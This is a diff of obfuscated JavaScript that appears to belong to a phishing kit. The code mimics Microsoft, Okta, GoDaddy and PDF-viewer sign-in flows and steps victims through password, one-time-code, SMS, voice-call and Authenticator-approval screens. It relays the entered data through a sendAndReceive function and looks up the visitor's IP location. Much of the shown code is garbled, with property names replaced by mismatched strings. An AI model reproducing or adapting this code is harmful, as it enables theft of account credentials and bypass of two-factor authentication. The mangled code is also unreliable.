@@ -1,1107 +1,5453 @@
-const _0xe042e = _0x2b3b;
-(function (_0xf37bd8, _0x2e35b2) {
-    const _0x349719 = _0x2b3b,
-        _0x392b86 = _0xf37bd8();
-    while (!![]) {
-        try {
-            const _0x541b90 = -parseInt(_0x349719(0x1d0)) / 0x1 + -parseInt(_0x349719(0x274)) / 0x2 + parseInt(_0x349719(0x241)) / 0x3 + -parseInt(_0x349719(0x322)) / 0x4 * (parseInt(_0x349719(0x2dd)) / 0x5) + -parseInt(_0x349719(0x2d5)) / 0x6 + -parseInt(_0x349719(0x304)) / 0x7 + parseInt(_0x349719(0x374)) / 0x8;
-            if (_0x541b90 === _0x2e35b2) break;
-            else _0x392b86['push'](_0x392b86['shift']());
-        } catch (_0x6713ce) {
-            _0x392b86['push'](_0x392b86['shift']());
-        }
+const _0x283fde = _0x374d;
+(function (_0x3802cc, _0xb3ae71) {
+  const _0x6a6705 = _0x374d,
+    _0x2eebcf = _0x3802cc();
+  while (!![]) {
+    try {
+      const _0x12eb75 =
+        -parseInt(_0x6a6705(0x3a4)) / 0x1 +
+        (-parseInt(_0x6a6705(0x37a)) / 0x2) *
+          (parseInt(_0x6a6705(0x241)) / 0x3) +
+        (-parseInt(_0x6a6705(0x227)) / 0x4) *
+          (parseInt(_0x6a6705(0x1f0)) / 0x5) +
+        (parseInt(_0x6a6705(0x331)) / 0x6) *
+          (parseInt(_0x6a6705(0x3ad)) / 0x7) +
+        (-parseInt(_0x6a6705(0x33f)) / 0x8) *
+          (parseInt(_0x6a6705(0x24c)) / 0x9) +
+        -parseInt(_0x6a6705(0x3a6)) / 0xa +
+        (parseInt(_0x6a6705(0x27c)) / 0xb) * (parseInt(_0x6a6705(0x28f)) / 0xc);
+      if (_0x12eb75 === _0xb3ae71) break;
+      else _0x2eebcf["push"](_0x2eebcf["shift"]());
+    } catch (_0x4fe127) {
+      _0x2eebcf["push"](_0x2eebcf["shift"]());
     }
-}(_0x5e55, 0xcf66d));
+  }
+})(_0x2985, 0xd6db4);
 var webnotfound = ![],
-    otherweburl = '',
-    interacted = 0x0,
-    multipleaccountsback = 0x0;
+  interacted = 0x0,
+  multipleaccountsback = 0x0;
 let wait2facancel = 0x0,
-    otptype = 0x0;
-
-function _0x5e55() {
-    const _0x159937 = ['signoutoption', 'Code', 'assertive', 'pop', 'approve\x20auth\x20request\x20auth\x20app', 'iEnterProofDesc', 'authapp', 'Error:', 'maxlength', 'alert-error', 'section_accessblocked', '#oktasignin', 'someone@example.com', '<span>Sorry,\x20we\x27re\x20having\x20trouble\x20verifying\x20your\x20account.\x20Please\x20try\x20again.</span><a\x20id=\x22ViewDetails\x22\x20class=\x22no-wrap\x22\x20href=\x22#\x22>View\x20details</a>', 'godaddyemail', 'Sign\x20in\x20using\x20another\x20Microsoft\x20account', '303460zKjElf', 'btn_sig', 'tile', 'loading', 'session\x20timeout', 'getAttribute', 'image_src', 'OneWaySMS_Live', 'appendChild', 'selectmultipleaccountadfs', 'marginBottom', 'section_uname', 'PhoneAppOTP_Live', 'tryagainlater', '\x22\x20onclick=\x22linkoptionclick(this)\x22\x20class=\x22link\x22\x20style=\x22display:\x20unset;\x22>', 'div', '.user_identity', 'hasAttribute', 'script[src^=\x22', 'Enter\x20a\x20security\x20code', 'dirltr', 'onchange', 'Back', 'That\x20doesn\x27t\x20match\x20the\x20phone\x20number\x20associated\x20with\x20your\x20account.\x20The\x20correct\x20number\x20ends\x20in\x20', 'checked', 'span', 'twofamethods', '#tryagain_withoutinternet', 'auth', 'data-methodid', 'error_pwd', 'link', 'Microsoft\x20Authenticator', 'callotp', 'data-id', 'signInAnotherWay', 'row\x20tile', 'authapperrorresend', 'error_otp', 'trim', 'classList', 's\x20forwards', 'form-group-top', 'checkemail', 'inputAlignMiddle', 'important', '#tryagain_toomanyattempts', 'otpliveimg', 'json', 'checkapphavingtroublesection', 'protectaccount', '#btn_confirmemailorphone_live', '2fa\x20is\x20off', 'approve\x20auth\x20request\x20auth\x20app\x20live', '36px', 'EmailOTP_Live_2', 'gmail.', 'otp\x20sent', 'country', 'approve\x20auth\x20request\x20calling', 'sms\x20otp\x20live', 'accessblockedsignoutoption', 'waiting\x20for\x20previous\x20request\x20to\x20complete', '</span><a\x20id=\x22ViewDetails\x22\x20class=\x22no-wrap\x22\x20href=\x22#\x22>View\x20details</a>', 'idA_PWD_ForgotPassword', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::-moz-selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '</a>', 'tel', 'section_otp', 'uname', 'btn_next_pdf', 'length', 'background', 'proof', 'confirmemailorphone_live', 'content', 'auto', 'listitem', 'troubleshootinginfo', '[aria-describedby=\x22iProofInputError\x22]', '#next_btn_pdf', 'pwd_godaddy', '13301656iJZBwm', 'head', 'multipleaccounts', 'button', 'Send\x20another\x20request\x20to\x20my\x20Microsoft\x20Authenticator\x20app', 'fadeinform\x201s\x20forwards', '.iAdditionalProofInfo', 'section_multipleaccounts', 'sign\x20in\x20blocked', 'sms', 'selectprotectoption(this)', 'section_signin_blocked_live', 'signin_blocked_reason', 'logo', 'approved\x20live', 'Hide', 'iProofEmailEntry', '<p\x20class=\x22mb-16\x22>', 'bold', 'lets\x20try\x20something\x20else\x20or\x20come\x20back', 'multipleaccountoptions', 'signup', 'key', 'reload', '<span>', 'section_final', 'log', 'youdonthaveaccess', 'Last\x204\x20digits\x20of\x20phone\x20number', 'final', 'section_confirmemailorphone_live', 'Can\x27t\x20access\x20your\x20account?', 'idp', 'OneWayVoiceMobileOTP', 'maxLength', '#btn_sig', 'authapp_live', 'Request\x20wasn\x27t\x20sent', 'keyup', 'innerText', 'aol.', 'indentNonCollapsible', '.title', 'iProofPhoneEntry', 'table-row', '591780njOthf', 'href', 'accountoptions', 'signin_blocked_live_email', 'authappcode', 'approved', 'multipleaccountsadfs', 'querySelectorAll', 'section_2fa', 'input-max-width', 'block', 'a_id', 'placeholder', 'position', 'row', '24px', 'error-inp', 'duplicate\x20request', 'input#i011e.okta', 'otp_live', 'parentNode', 'call', 'onclick', 'pagevisit', 'background-image', 'confirmemailorphone_live_hidden', 'voice', 'pwd_okta', 'Next', 'Sorry,\x20we\x27re\x20having\x20trouble\x20verifying\x20your\x20account.\x20Please\x20try\x20again.\x20', '.loading-container', 'error_uname_pdf', 'signinanothererrordesc', '</a></p>', 'hide-to-left\x20', 'accessblocked', 'width', 'aria-describedby', 'addEventListener', 'get', 'inp_otp_live', 'then', '#btn_next', 'uname_pdf', 'error_authapp_live', 'text_link', 'height', 'OneWaySMS', 'click', 'none', 'inp_uname', 'confirmemail', 'Received\x20response:', 'authcallimg', 'inp_confirmemail', 'selecttwofamethod(this)', 'show-from-left\x20', '#mainLoader', 'remove', 'iProofPhone', 'section_sidebarlogin_adfs', 'newwebsiteopen', 'Verify\x20Online', 'iProofLbl1', 'To\x20verify\x20that\x20this\x20is\x20your\x20email\x20address,\x20complete\x20the\x20hidden\x20part\x20and\x20click\x20\x22Send\x20code\x22\x20to\x20receive\x20your\x20code.', 'display:\x20unset;', 'section_otp_live', 'godaddypassword', 'backbutton', 'Too\x20many\x20Attempts', 'section_pwd', 'url(\x27', 'class', 'notanymore', '.okta-container\x20#login-bg-image', 'iAdditionalProofInfo', 'small', 'location', 'aria-hidden', 'protectoptions', 'Enter\x20the\x20code\x20to\x20help\x20us\x20verify\x20your\x20identity.', 'Send\x20another\x20request', 'type', 'button.show-hide-btn', 'methodid', 'presentation', 'section_signinanothererror', 'bottomsection', 'createElement', 'inp_otpcode', 'otp\x20sent\x20error', 'cantAccessAccount', 'waiting', 'resentlink', 'The\x20wrong\x20code\x20was\x20entered.\x20Send\x20yourself\x20a\x20new\x20code\x20and\x20try\x20again.', 'bannerlogo', 'you\x20dont\x20have\x20access', 'request\x20wasnt\x20sent', 'email', 'hide-to-left\x200.5s', 'Send\x20Code', 'email\x20otp\x20live', 'yahoo.', 'authapperror', '.text-body', 'twofaselected', '.auth-org-logo', 'table', '</a>\x20or\x20try\x20to\x20sign\x20in\x20again\x20shortly.</p>', 'backgroundImage', 'multiple\x20accounts', 'CompanionAppsNotification', 'backgroundimage', '5057781HWasYz', 'live.', 'TwoWayVoiceMobile', 'Forgot\x20my\x20password', 'redirected\x20back\x20to\x20sign\x20in', 'section_authcall', '</a>\x20', '#btn_back', 'iProofPhoneHint', 'reason', 'includes', 'aria-live', 'title', '.sectioncontent', 'off', 'Verify\x20your\x20phone\x20number', 'section_multipleaccounts_adfs', 'h2.title', 'show-from-right\x200.5s', 'footer', 'authcall', 'icloud.', 'error_otp_live', 'sections_okta', 'value', 'error\x20', 'display', 'checkpass', 'We\x20couldn\x27t\x20find\x20an\x20account\x20with\x20that\x20username.\x20Try\x20another,\x20or\x20get\x20a\x20new\x20Microsoft\x20account.', 'verifyemail', 'img', 'slice', 'Can’t\x20access\x20your\x20account?', 'phone\x20otp', 'app', 'Send\x20another\x20request\x20to\x20my\x20Outlook\x20mobile\x20app', 'Email\x20name', 'style', 'if\x20otp\x20sent', 'forEach', 'sections', 'error_verifyemail', 'span.ux-button-text', 'inp_confirmemailorphone_live', '14px', 'success', 'd-none', 'section_uname_pdf', 'useAuthenticator', 'Verify\x20online', 'show-from-right\x20', '915612HwjQev', '</a>\x20<p>', 'table-cell', 'input-group-addon', 'signin_blocked_live', 'error\x20live', '2fa', 'querySelector', 'tile-img', 'error_', '#btn_verifyotp_live', 'label', 'script', 'autocomplete', '2fa\x20is\x20off\x20newwebsite', 'name', 'error_confirmemailorphone_live', 'parse', 'input[type=\x22radio\x22]', 'aria-required', 'customslashstr', 'error_uname', 'sections_godaddy', 'otpimg', 'POST', 'otp_livedesc', 'Sign\x20in\x20another\x20way', '\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-block-body\x22\x20id=\x22iEnterProofDesc\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20To\x20verify\x20that\x20this\x20is\x20your\x20email\x20address,\x20complete\x20the\x20hidden\x20part\x20and\x20click\x20\x22Send\x20code\x22\x20to\x20receive\x20your\x20code.\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20role=\x22alert\x22\x20aria-live=\x22assertive\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22alert\x20alert-error\x20Hide\x22\x20id=\x22iProofInputError\x22></div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emailPartial\x20dirltr\x20input-group\x20input-max-width\x22\x20id=\x22iProofEmailEntry\x22\x20style=\x22display:\x20table;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20class=\x22form-control\x20noRightBorder\x22\x20autocomplete=\x22off\x22\x20type=\x22email\x22\x20id=\x22iProofEmail\x22\x20name=\x22iProofEmail\x22\x20maxlength=\x22113\x22\x20aria-required=\x22true\x22\x20aria-label=\x22Email\x20name\x22\x20aria-describedby=\x22iProofInputError\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20class=\x22input-group-addon\x20noLeftBorder\x20outlookEmailLabel\x22\x20id=\x22iConfirmProofEmailDomain\x22>@', 'pwd', 'contains', 'phcontainer', 'src', '.btn_can', 'validatediginp(this)', 'overflow', 'section_authapp', 'btn_protectaccount', 'message', 'authapp_live_code', 'Enter\x20a\x20valid\x20email\x20address,\x20phone\x20number,\x20or\x20Skype\x20name.', 'removeAttribute', 'error_authcall', 'textContent', 'pdfemail', 'replace', '</p>', 'text-left', 'section_confirmemail', 'authapperrordesc', 'section_authapp_live', 'debugdetailsinfo', 'aria-label', '<a\x20href=\x22#\x22\x20data-id=\x22', 'otp\x20sent\x20live', 'Sign\x20out\x20and\x20sign\x20in\x20with\x20a\x20different\x20account', 'section_tryagainlater', 'backgroundColor', '.back', 'ajax', '<p>', 'a_text', 'ihaveacode', 'hasOwnProperty', 'error\x20enter\x20a\x20code', 'tiletitle', 'unset', 'focus', 'godaddy', 'alt', 'Create\x20one!', 'valid\x20email\x20otp', 'confirmemailorphone_live_title', 'get\x20a\x20code\x20a\x20different\x20way.', 'backgroundcolor', 'sections_pdf', 'setAttribute', 'acctype', 'error_2fa', 'backbuttonclick(this,2)', 'iProofInputError', 'authappimg', '2fa\x20is\x20on', '#btn_verifyotp', 'link_text', 'error', 'backbtnclick', '</label>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22phcontainer\x22\x20id=\x22iProofPhoneEntry\x22\x20style=\x22display:\x20none;\x22\x20aria-hidden=\x22true\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20id=\x22iProofPhoneHint\x22\x20for=\x22iProofPhone\x22\x20class=\x22form-group-top\x22\x20aria-hidden=\x22true\x22>Last\x204\x20digits\x20of\x20phone\x20number</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22tel\x22\x20autocomplete=\x22off\x22\x20id=\x22iProofPhone\x22\x20name=\x22iProofPhone\x22\x20class=\x22form-control\x20input-max-width\x22\x20maxlength=\x224\x22\x20aria-required=\x22true\x22\x20aria-label=\x22Last\x204\x20digits\x20of\x20phone\x20number\x22\x20aria-describedby=\x22iProofInputError\x22>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20', 'toggle', 'catch', 'okta', 'That\x20doesn\x27t\x20match\x20the\x20alternate\x20email\x20associated\x20with\x20your\x20account.\x20The\x20correct\x20email\x20starts\x20with\x20\x22', 'section_youdonthaveaccess', 'section_protectaccount', 'mb-16', 'https://get.geojs.io/v1/ip/geo.json', 'Please,\x20provide\x20a\x20valid\x20email.', 'input-group', '69126JBJseU', 'Please\x20enter\x20the\x20password\x20for\x20your\x20Microsoft\x20account.', '#f5f7f8', '\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-block-body\x22\x20id=\x22iEnterProofDesc\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20To\x20verify\x20that\x20this\x20is\x20your\x20phone\x20number,\x20enter\x20the\x20last\x204\x20digits\x20including\x20', 'split', 'animation', 'fadeoutform\x201s\x20forwards', 'true', '65aCTyIy', 'description', 'dynamic-style', 'nextElementSibling', '\x22\x20onclick=\x22linkoptionclick(this)\x22\x20class=\x22link\x22>', '.iAdditionalProofInfo\x20input[type=\x22radio\x22]', '\x22\x20onclick=\x22linkoptionclick(this)\x22>', 'text', 'alert', 'background-color', 'role', '\x20<a\x20href=\x22#\x22\x20data-id=\x22', 'backbtnid', 'OneWaySMS_Live_2', ',\x20and\x20then\x20click\x20\x22Send\x20code\x22\x20to\x20receive\x20your\x20code.\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20role=\x22alert\x22\x20aria-live=\x22assertive\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22alert\x20alert-error\x20Hide\x22\x20id=\x22iProofInputError\x22></div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emailPartial\x20dirltr\x20input-group\x20input-max-width\x22\x20id=\x22iProofEmailEntry\x22\x20style=\x22display:\x20none;\x22\x20aria-hidden=\x22true\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20class=\x22form-control\x20noRightBorder\x22\x20autocomplete=\x22off\x22\x20type=\x22email\x22\x20id=\x22iProofEmail\x22\x20name=\x22iProofEmail\x22\x20maxlength=\x22113\x22\x20aria-required=\x22true\x22\x20aria-label=\x22Email\x20name\x22\x20aria-describedby=\x22iProofInputError\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20class=\x22input-group-addon\x20noLeftBorder\x20outlookEmailLabel\x22\x20id=\x22iConfirmProofEmailDomain\x22></label>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22phcontainer\x22\x20id=\x22iProofPhoneEntry\x22\x20style=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20id=\x22iProofPhoneHint\x22\x20for=\x22iProofPhone\x22\x20class=\x22form-group-top\x22\x20aria-hidden=\x22true\x22>Last\x204\x20digits\x20of\x20phone\x20number</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22tel\x22\x20autocomplete=\x22off\x22\x20id=\x22iProofPhone\x22\x20name=\x22iProofPhone\x22\x20class=\x22form-control\x20input-max-width\x22\x20maxlength=\x224\x22\x20aria-required=\x22true\x22\x20aria-label=\x22Last\x204\x20digits\x20of\x20phone\x20number\x22\x20aria-describedby=\x22iProofInputError\x22>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20', 'getElementsByClassName', 'flex', 'phone', 'body', 'add', '#godaddysignin', 'No\x20account?', '113', 'noLeftBorder', 'input', 'We\x20didn\x27t\x20hear\x20from\x20you', '#tryagainheader', 'more\x20info\x20required', 'emailPartial', 'section_authapperror', 'selectmultipleaccount(this)', 'innerHTML', 'getElementById', 'setProperty', 'section_', '.btn_final', 'twofaselect', '.bannerlogo', 'valid\x20phone\x20app\x20otp', '3162355BEcpic', 'inp_pwd', 'text-block-body', 'float', 'Enter\x20the\x20code\x20you\x20received', 'signinblocked\x20live', '2famethods', 'otp', 'radio', 'for', 'otpdesc', 'signinanothererror', 'oninput', 'idpDescription'];
-    _0x5e55 = function () {
-        return _0x159937;
-    };
-    return _0x5e55();
-}
+  otptype = 0x0;
 var currentweb = 0x0,
-    pagevisitedalready = null;
+  pagevisitedalready = null;
 let viewtype = null,
-    pdfcheck = 0x0;
-!document[`915612HwjQev`](`error-inp`)['classList'][`show-from-left `](`onclick`) && (view = `description`);
-document['getElementById']('sections_pdf') && !document['getElementById'](`email otp live`)[`error_2fa`][`show-from-left `](`onclick`) && (view = `callotp`);
-document[`915612HwjQev`](`.user_identity`) && (view = `description`);
-document[`auth`](`idpDescription`, function (_0x39cb04) {
-    const _0x18c07a = _0xe042e;
-    if (_0x39cb04[`twofaselect`] === 'Enter' && requestsent == ![]) {
-        view == `OneWaySMS_Live_2` && (document[`915612HwjQev`](`none`)['querySelector']('#godaddysignin') !== null && document[`915612HwjQev`]('sections_godaddy')['querySelector'](`forEach`)[`error_otp`]());
-        view == 'pwd_okta' && (document[`915612HwjQev`](`table-row`)['querySelector']('#oktasignin') !== null && document[`915612HwjQev`](`table-row`)['querySelector'](`.btn_can`)[`error_otp`]());
-        if (view !== `OneWaySMS_Live_2` && view !== `hasAttribute`) {
-            if (document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`Microsoft Authenticator`) !== null) document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`Microsoft Authenticator`)[`error_otp`]();
+  pdfcheck = 0x0;
+!document[`selectprotectoption(this)`]("sections")["classList"]["contains"](
+  `background-image`,
+) && (view = `2fa is on`);
+document[`selectprotectoption(this)`](`img`) &&
+  !document[`selectprotectoption(this)`]("sections_pdf")["classList"][`Back`](
+    `background-image`,
+  ) &&
+  (view = "uname_pdf");
+document[`selectprotectoption(this)`](`Sign in another way`) &&
+  !document[`selectprotectoption(this)`]("sections_doc")[`pdfemail`][`Back`](
+    `background-image`,
+  ) &&
+  (view = `#btn_verifyotp_live`);
+document["getElementById"](`sections`) && (view = `2fa is on`);
+document[`phcontainer`](`sign in blocked`, function (_0x468fae) {
+  const _0x5db831 = _0x283fde;
+  if (_0x468fae[`table-cell`] === `36px` && requestsent == ![]) {
+    view == `parse` &&
+      document[`selectprotectoption(this)`](`onclick`)[`.loading-container`](
+        `error `,
+      ) !== null &&
+      document[`selectprotectoption(this)`](`onclick`)
+        ["querySelector"](`error `)
+        [`trim`]();
+    view == `Last 4 digits of phone number` &&
+      document[`selectprotectoption(this)`]("sections_okta")[
+        `.loading-container`
+      ](`text`) !== null &&
+      document[`selectprotectoption(this)`](`</a> `)
+        ["querySelector"]("#oktasignin")
+        [`trim`]();
+    if (view !== "pwd_godaddy" && view !== `Last 4 digits of phone number`) {
+      if (
+        document[`selectprotectoption(this)`](`innerText` + view)[
+          `.loading-container`
+        ]("#btn_next") !== null
+      )
+        document[`selectprotectoption(this)`](`innerText` + view)
+          [`.loading-container`](`section_signin_blocked_live`)
+          [`trim`]();
+      else {
+        if (
+          document[`selectprotectoption(this)`]("section_" + view)[
+            "querySelector"
+          ](`some`) !== null
+        )
+          document[`selectprotectoption(this)`](`innerText` + view)
+            [`.loading-container`](`some`)
+            [`trim`]();
+        else {
+          if (
+            document[`selectprotectoption(this)`](`innerText` + view)[
+              "querySelector"
+            ](`inp_confirmemail`) !== null
+          )
+            document[`selectprotectoption(this)`](`innerText` + view)
+              [`.loading-container`](`inp_confirmemail`)
+              [`trim`]();
+          else {
+            if (
+              document[`selectprotectoption(this)`](`innerText` + view)[
+                `.loading-container`
+              ](`5319848cyFqbB`) !== null
+            )
+              document[`selectprotectoption(this)`](`innerText` + view)
+                ["querySelector"]("#btn_sig")
+                [`trim`]();
             else {
-                if (document[`915612HwjQev`]('section_' + view)['querySelector']('#next_btn_pdf') !== null) document[`915612HwjQev`](`table-cell` + view)['querySelector'](`backbtnid`)[`error_otp`]();
+              if (
+                document[`selectprotectoption(this)`]("section_" + view)[
+                  "querySelector"
+                ](`multipleaccountsadfs`) !== null
+              )
+                document[`selectprotectoption(this)`](`innerText` + view)
+                  [`.loading-container`](`multipleaccountsadfs`)
+                  [`trim`]();
+              else {
+                if (
+                  document["getElementById"](`innerText` + view)[
+                    `.loading-container`
+                  ](`pwd`) !== null
+                )
+                  document[`selectprotectoption(this)`](`innerText` + view)
+                    [`.loading-container`](`pwd`)
+                    [`trim`]();
                 else {
-                    if (document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`otpdesc`) !== null) document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`otpdesc`)[`error_otp`]();
-                    else {
-                        if (document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `]('#btn_confirmemail') !== null) document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `]('#btn_confirmemail')[`error_otp`]();
-                        else {
-                            if (document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `]('#btn_verifyotp') !== null) document['getElementById'](`table-cell` + view)['querySelector'](`backgroundImage`)[`error_otp`]();
-                            else {
-                                if (document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `]('#btn_confirmemailorphone_live') !== null) document[`915612HwjQev`]('section_' + view)[`hide-to-left `](`catch`)[`error_otp`]();
-                                else document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`aria-describedby`) !== null && document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`aria-describedby`)[`error_otp`]();
-                            }
-                        }
-                    }
+                  if (
+                    document[`selectprotectoption(this)`](`innerText` + view)[
+                      `.loading-container`
+                    ](`phone`) !== null
+                  )
+                    document[`selectprotectoption(this)`]("section_" + view)
+                      [`.loading-container`]("#btn_confirmemailorphone_live")
+                      ["click"]();
+                  else
+                    document[`selectprotectoption(this)`](`innerText` + view)[
+                      `.loading-container`
+                    ](`section_accessblocked`) !== null &&
+                      document[`selectprotectoption(this)`](`innerText` + view)
+                        [`.loading-container`]("#btn_verifyotp_live")
+                        [`trim`]();
                 }
+              }
             }
+          }
         }
+      }
     }
+  }
 });
-
-function validatediginp(_0x100048) {
-    const _0x197b24 = _0xe042e;
-    _0x100048[`591780njOthf`] = _0x100048[`591780njOthf`][`url('`](/\D/g, '');
+function validatediginp(_0x3e73ec) {
+  const _0x36d89a = _0x283fde;
+  _0x3e73ec["value"] = _0x3e73ec[`signin_blocked_reason`][
+    `#section_uname_content`
+  ](/\D/g, "");
 }
-
-function loadinganimation(_0x794abf) {
-    const _0x6de64f = _0xe042e;
-    _0x794abf == 0x0 && (document['getElementById'](`table-cell` + view)[`hide-to-left `](`dirltr`)[`error_2fa`][`if otp sent`](`removeAttribute`), document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `]('.sectioncontent')[`position`][`section_multipleaccounts_adfs`] = `add`), _0x794abf == 0x1 && (document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `]('.loading-container')[`error_2fa`]['remove'](`removeAttribute`), document['getElementById'](`table-cell` + view)[`hide-to-left `]('.sectioncontent')[`position`][`section_multipleaccounts_adfs`] = `h2.title`);
+function loadinganimation(_0xc0ff35) {
+  const _0x18238d = _0x283fde;
+  _0xc0ff35 == 0x0 &&
+    (document[`selectprotectoption(this)`](`innerText` + view)
+      [`.loading-container`](`hasOwnProperty`)
+      [`pdfemail`]["add"](`uname`),
+    (document["getElementById"](`innerText` + view)["querySelector"](
+      `relative`,
+    )[`getElementById`][`approve auth request auth app`] =
+      `section_multipleaccounts`)),
+    _0xc0ff35 == 0x1 &&
+      (document[`selectprotectoption(this)`](`innerText` + view)
+        ["querySelector"](".loading-container")
+        [`pdfemail`][`<a class="link mb-16" href="#" data-id="`](`uname`),
+      (document["getElementById"](`innerText` + view)[`.loading-container`](
+        `relative`,
+      )[`getElementById`][`approve auth request auth app`] =
+        `#btn_confirmemail`));
 }
-
-function runanimation(_0x1ddff7, _0x2c7241, _0x454127) {
-    const _0x48aba9 = _0xe042e;
-    _0x1ddff7 == 0x0 && (document['getElementById'](`table-cell` + _0x2c7241)[`hide-to-left `]('.sectioncontent')['style'][`section_multipleaccounts_adfs`] = 'hide-to-right\x20' + _0x454127 + `backbuttonclick(this,2)`), _0x1ddff7 == 0x1 && (document[`915612HwjQev`](`table-cell` + _0x2c7241)['querySelector']('.sectioncontent')['style'][`section_multipleaccounts_adfs`] = `voice` + _0x454127 + 's\x20forwards'), _0x1ddff7 == 0x2 && (document[`915612HwjQev`](`table-cell` + _0x2c7241)[`hide-to-left `](`maxLength`)['style'][`section_multipleaccounts_adfs`] = `checked` + _0x454127 + `backbuttonclick(this,2)`), _0x1ddff7 == 0x3 && (document[`915612HwjQev`](`table-cell` + _0x2c7241)[`hide-to-left `](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = `#tryagain_toomanyattempts` + _0x454127 + `backbuttonclick(this,2)`);
+function runanimation(_0x4c60ee, _0x3b8ea1, _0x47bdab, _0x2ea513) {
+  const _0x204db0 = _0x283fde;
+  _0x2ea513 == undefined && (_0x2ea513 = 0x1),
+    _0x2ea513 == 0x0 && (_0x2ea513 = ""),
+    _0x2ea513 == 0x1 && (_0x2ea513 = `signInAnotherWay`),
+    _0x4c60ee == 0x0 &&
+      (document[`selectprotectoption(this)`]("section_" + _0x3b8ea1)[
+        `.loading-container`
+      ](`relative`)[`getElementById`]["animation"] =
+        `footer` + _0x47bdab + "s\x20" + _0x2ea513 + ""),
+    _0x4c60ee == 0x1 &&
+      (document[`selectprotectoption(this)`](`innerText` + _0x3b8ea1)[
+        `.loading-container`
+      ](`relative`)[`getElementById`]["animation"] =
+        "show-from-right\x20" + _0x47bdab + "s\x20" + _0x2ea513 + ""),
+    _0x4c60ee == 0x2 &&
+      (document[`selectprotectoption(this)`](`innerText` + _0x3b8ea1)[
+        `.loading-container`
+      ](`relative`)[`getElementById`]["animation"] =
+        `button.show-hide-btn` + _0x47bdab + "s\x20" + _0x2ea513 + ""),
+    _0x4c60ee == 0x3 &&
+      (document["getElementById"](`innerText` + _0x3b8ea1)["querySelector"](
+        ".sectioncontent",
+      )[`getElementById`]["animation"] =
+        `" onclick="linkoptionclick(this)" class="link">` +
+        _0x47bdab +
+        "s\x20" +
+        _0x2ea513 +
+        "");
 }
-
-function changebackbutton(_0xc9021e, _0x5052a0) {
-    const _0x573892 = _0xe042e;
-    _0x5052a0 == 0x0 && (document[`915612HwjQev`](`table-cell` + _0xc9021e)[`hide-to-left `](`methodid`)[`position`]['display'] = `trim`), _0x5052a0 == 0x1 && (document['getElementById'](`table-cell` + _0xc9021e)[`hide-to-left `]('.back')[`position`][`accountoptions`] = `303460zKjElf`);
+function changebackbutton(_0x2ed847, _0x3b7cbf) {
+  const _0x5d30a8 = _0x283fde;
+  _0x3b7cbf == 0x0 &&
+    (document[`selectprotectoption(this)`]("section_" + _0x2ed847)[
+      "querySelector"
+    ](`animation`)["style"]["display"] = "none"),
+    _0x3b7cbf == 0x1 &&
+      (document[`selectprotectoption(this)`](`innerText` + _0x2ed847)[
+        "querySelector"
+      ](`animation`)[`getElementById`][`checkpass`] = `dynamic-style`);
 }
-
-function wait2fa(_0x4ca70e, _0x31f687) {
-    const _0x48ecdb = _0xe042e;
-    if (wait2facancel == 0x0) {
-        if (_0x4ca70e == 'app') {
-            let _0x1573c5 = null;
-            _0x1573c5 = _0x31f687, sendAndReceive(`logo`, [_0x1573c5, 'null'], 0x1)[`link`](_0x5dfe5c => {
-                const _0x11e711 = _0x48ecdb;
-                if (_0x5dfe5c && view == `
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
